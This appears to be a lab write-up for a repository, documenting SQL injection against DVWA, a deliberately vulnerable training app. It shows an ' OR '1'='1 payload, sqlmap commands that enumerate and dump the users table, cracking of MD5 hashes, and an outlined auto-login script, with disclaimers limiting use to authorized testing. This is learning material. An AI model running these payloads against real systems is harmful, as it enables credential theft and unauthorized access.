⚠️ **Disclaimer**: Educational purpose only. Do not test on systems you don’t own or have explicit permission for.

---

# 💉 SQL Injection – DVWA

## 🔍 Objective
Exploit SQL Injection vulnerability in DVWA to extract user credentials, crack them, and confirm successful login.

---

## 🛠️ Steps Taken

1. **Initial Testing**
   - Selected *SQL Injection* module in DVWA.
   - Input field vulnerable to `' OR '1'='1` payload.
   - Verified: Application returned all users → SQL Injection confirmed.

2. **Exploitation with SQLMap**
   - Ran SQLMap on vulnerable parameter:
     ```bash
     sqlmap -u "http://<YOUR_LOCAL_IP>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=<YOUR_PHPSESSID>; security=low" --dbs
     ```
   - Discovered database: **dvwa**

3. **Dumping Tables**
   ```bash
   sqlmap -u "http://<YOUR_LOCAL_IP>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=<YOUR_PHPSESSID>; security=low" -D dvwa --tables
- Found tables: users, guestbook

4. **Dumping Users**
   ```bash
   sqlmap -u "http://<YOUR_LOCAL_IP>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=xxxxx; security=low" -D dvwa -T users --dump
- Extracted usernames + password hashes

5. **Password Cracking**
- Cracked MD5 hashes using sqlmap’s default dictionary
- Example:
    - admin → password

6. **Verification with Python**
- Created sqli_login.py
- Script:
    - Fetches CSRF user_token
    - Logs in with admin / password
    - Confirms success by checking dashboard page

---

## 📸 Proof

- Screenshot: SQLMap database dump
- Screenshot: Cracked password
- Screenshot: Python script auto-login success

---

## ✅ Result

- Successfully exploited SQL Injection:
    - Extracted sensitive data
    - Cracked hashes
    - Automated login → Full access as admin

## ⚠️ Disclaimer

This project is created strictly for educational and research purposes only.
The tests shown here are performed on DVWA (Damn Vulnerable Web Application), a deliberately insecure environment designed for learning.
  - Do NOT use these techniques on any system, application, or    website that you do not own or do not have explicit permission to test.

  - Unauthorized hacking, exploitation, or intrusion into real systems is illegal and punishable under cybersecurity laws.

  - The author of this repository is not responsible for any misuse of the information or code provided.

By using this repository, you agree to use it only in safe, legal, and controlled environments like DVWA.